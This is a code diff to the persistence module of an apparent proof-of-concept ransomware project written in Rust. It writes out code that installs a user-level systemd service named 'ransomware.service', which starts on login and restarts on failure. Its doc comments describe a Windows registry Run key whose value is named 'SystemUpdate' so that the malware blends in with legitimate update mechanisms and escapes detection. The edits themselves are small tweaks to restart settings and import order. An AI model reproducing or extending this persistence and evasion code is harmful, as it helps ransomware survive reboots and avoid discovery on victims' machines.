@@ -9,7 +9,7 @@
 //! Creates a user-level systemd service that:
 //! - Runs without root privileges (`~/.config/systemd/user/`)
 //! - Starts automatically on user login (`default.target` dependency)
-//! - Restarts on crash (`Restart=always`, `RestartSec=5`)
+//! - Restarts only on crash (`Restart=on-failure`)
 //! - Persists across reboots (`systemctl --user enable`)
 //!
 //! ## Windows: Registry Run Key
@@ -30,7 +30,7 @@
 use dirs2::home_dir;
 use std::{
     env,
-    fs::{File, create_dir_all},
+    fs::{create_dir_all, File},
     io::{Error, Result, Write},
     process::Command,
 };
@@ -49,8 +49,7 @@ use std::{
 /// [Service]
 /// Type=simple
 /// ExecStart=/path/to/rustyransom
-/// Restart=always
-/// RestartSec=5
+/// Restart=on-failure
 ///
 /// [Install]
 /// WantedBy=default.target
@@ -87,9 +86,9 @@ fn linux_persistence() -> Result<()> {
     let systemd_path = home.join(".config/systemd/user");
     let service_path = systemd_path.join("ransomware.service");
 
-    // Systemd service unit file with auto-restart configuration
+    // Systemd service unit file with crash recovery
     let service_str = format!(
-        "[Unit]\nDescription=PoC Ransomware\n\n[Service]\nType=simple\nExecStart=\"{}\"\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=default.target",
+        "[Unit]\nDescription=PoC Ransomware\n\n[Service]\nType=simple\nExecStart=\"{}\"\nRestart=on-failure\n\n[Install]\nWantedBy=default.target",
         current_path.to_string_lossy()
     );
 
@@ -161,8 +160,8 @@ fn linux_persistence() -> Result<()> {
 /// The value name `SystemUpdate` is chosen to blend in with legitimate Windows
 /// update mechanisms, making detection less likely during casual inspection.
 fn windows_persistence() -> Result<()> {
-    use winreg::RegKey;
     use winreg::enums::*;
+    use winreg::RegKey;
 
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
 
